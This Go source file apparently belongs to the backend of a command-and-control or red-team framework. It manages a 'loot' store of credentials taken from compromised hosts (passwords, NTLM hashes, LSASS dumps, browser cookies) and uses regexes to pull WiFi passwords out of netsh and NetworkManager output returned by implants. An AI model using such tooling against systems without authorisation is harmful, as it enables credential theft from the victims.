package api

import (
	"net/http"
	"regexp"
	"strconv"
	"strings"
	"time"

	"BackendTemplate/pkg/database"
	"BackendTemplate/pkg/errors"
	"github.com/gin-gonic/gin"
)

// ===== Loot 凭据/制品库(功能批) =====
// 集中管理行动中获取的凭据与制品: 手动录入、命令产出自动识别(如 WiFi 密码)、
// 凭据获取制品(LSASS 转储 / DPAPI 主密钥集 / 浏览器凭据与 Cookie，见 cred.go)、
// 截图等制品引用。库表 + CRUD + 按 uid/类型过滤 + 浏览器制品自动拆条入库。

// lootType 合法值校验(V1 枚举,前端过滤 pill 对齐)
var lootTypes = map[string]bool{
	"pwd":    true, // 明文密码
	"hash":   true, // NTLM/哈希
	"domain": true, // 域账号
	"note":   true, // 备忘(密钥/token/连接串等自由文本)
	"dump":   true, // 内存转储制品(LSASS 等;secret 存服务端文件路径,由操作员本地解析)
	"cookie": true, // 浏览器 Cookie(会话材料;secret 存 name=value)
}

// ListLoot GET /api/loot?uid=&type=&page=&size=
func ListLoot(c *gin.Context) {
	uid := strings.TrimSpace(c.Query("uid"))
	lootType := strings.TrimSpace(c.Query("type"))
	page, _ := strconv.Atoi(c.DefaultQuery("page", "1"))
	size, _ := strconv.Atoi(c.DefaultQuery("size", "200"))
	if page < 1 {
		page = 1
	}
	if size < 1 || size > 1000 {
		size = 200
	}

	if lootType != "" && lootType != "all" && !lootTypes[lootType] {
		c.JSON(http.StatusBadRequest, gin.H{"error": "type 非法"})
		return
	}
	items, total, err := database.LootStore_().PageFiltered(uid, lootType, (page-1)*size, size)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": errors.SanitizeError(err)})
		return
	}

	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": gin.H{
		"list":  items,
		"total": total,
	}})
}

// AddLoot POST /api/loot { uid, type, user, realm, host, secret, note }
// (operator+: 录入凭据属敏感操作,auditor 只读)
func AddLoot(c *gin.Context) {
	var body database.Loot
	if err := c.ShouldBindJSON(&body); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	body.Id = 0
	body.CreatedAt = time.Now().Format("2006-01-02 15:04:05")
	if body.Type == "" {
		body.Type = "note"
	}
	if !lootTypes[body.Type] {
		c.JSON(http.StatusBadRequest, gin.H{"error": "type 仅支持 pwd/hash/domain/note"})
		return
	}
	if strings.TrimSpace(body.Secret) == "" && strings.TrimSpace(body.Note) == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "secret 与 note 至少填一项"})
		return
	}
	if _, err := database.LootStore_().Insert(&body); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "入库失败: " + err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": body})
}

// DeleteLoot DELETE /api/loot/:id
func DeleteLoot(c *gin.Context) {
	id, err := strconv.Atoi(c.Param("id"))
	if err != nil || id <= 0 {
		c.JSON(http.StatusBadRequest, gin.H{"error": "id 非法"})
		return
	}
	if _, err := database.LootStore_().DeleteByID(int64(id)); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "删除失败: " + err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
}

// AddLootIfNotEmpty 命令产出自动入库的公共入口(供回包识别调用;静默失败仅记日志)
func AddLootIfNotEmpty(uid, lootType, user, realm, host, secret, note, source string) {
	if strings.TrimSpace(secret) == "" && strings.TrimSpace(note) == "" {
		return
	}
	if !lootTypes[lootType] {
		lootType = "note"
	}
	// 同一会话重复执行同一条提取命令（如 wifi 连跑两次）时避免重复入库
	item := database.Loot{
		Uid: uid, Type: lootType, User: user, Realm: realm, Host: host,
		Secret: secret, Note: note, Source: source,
	}
	if _, err := database.LootStore_().AddAutoIngest(&item); err != nil {
		// 静默: 自动入库失败不阻断命令回包主链路
		return
	}
}

// ===== 命令产出自动识别（V1：WiFi 配置文件）=====
//
// 按客户端 wifi 命令**自己的输出标记**识别，而不是泛化解析任意 "key: value"——
// 后者会把普通命令输出里的键值对误判成凭据。识别不到时不产生任何写入。
var (
	// Windows：客户端在每个配置前输出 "--- <SSID> ---"
	wifiSectionRe = regexp.MustCompile(`(?m)^---\s*(.+?)\s*---\s*$`)
	// Windows netsh 的密码行（中英文）
	wifiKeyLineRe = regexp.MustCompile(`(?mi)^\s*(?:关键内容|Key Content)\s*:\s*(.*?)\s*$`)
	// Linux NetworkManager 配置
	nmSSIDRe = regexp.MustCompile(`(?m)^ssid\s*=\s*(.+?)\s*$`)
	nmPSKRe  = regexp.MustCompile(`(?m)^psk\s*=\s*(.+?)\s*$`)
)

// IngestLootFromOutput 从一条命令回包中识别可入库的凭据，返回新入库条数。
// 由 main 注入到 command.LootIngestFunc，在命令输出落到 shell 内容之后调用。
func IngestLootFromOutput(uid, output string) int {
	if database.DB() == nil || strings.TrimSpace(output) == "" {
		return 0
	}
	return ingestWindowsWifi(uid, output) + ingestLinuxWifi(uid, output)
}

// ingestWindowsWifi 解析 "=== WiFi Profiles ===" + 每段 "--- SSID ---" 下的
// "关键内容/Key Content : <密码>"。
func ingestWindowsWifi(uid, output string) int {
	if !strings.Contains(output, "=== WiFi Profiles ===") {
		return 0
	}
	marks := wifiSectionRe.FindAllStringSubmatchIndex(output, -1)
	count := 0
	for i, m := range marks {
		ssid := strings.TrimSpace(output[m[2]:m[3]])
		end := len(output)
		if i+1 < len(marks) {
			end = marks[i+1][0]
		}
		section := output[m[1]:end]
		km := wifiKeyLineRe.FindStringSubmatch(section)
		if len(km) < 2 {
			continue
		}
		pwd := strings.TrimSpace(km[1])
		if pwd == "" {
			continue
		}
		AddLootIfNotEmpty(uid, "pwd", "", "", ssid, pwd, "WiFi 配置文件", "wifi")
		count++
	}
	return count
}

// ingestLinuxWifi 解析 NetworkManager 配置（cat 拼接、无块分隔符）：
// 按行扫描，ssid 出现在 psk 之前，用最近一次 ssid 给随后的 psk 配对。
func ingestLinuxWifi(uid, output string) int {
	if !nmPSKRe.MatchString(output) {
		return 0
	}
	lastSSID := ""
	count := 0
	for _, raw := range strings.Split(output, "\n") {
		line := strings.TrimSpace(raw)
		if m := nmSSIDRe.FindStringSubmatch(line); m != nil {
			lastSSID = strings.TrimSpace(m[1])
			continue
		}
		if m := nmPSKRe.FindStringSubmatch(line); m != nil {
			if pwd := strings.TrimSpace(m[1]); pwd != "" {
				AddLootIfNotEmpty(uid, "pwd", "", "", lastSSID, pwd,
					"WiFi 配置文件（NetworkManager）", "wifi")
				count++
			}
			lastSSID = ""
		}
	}
	return count
}
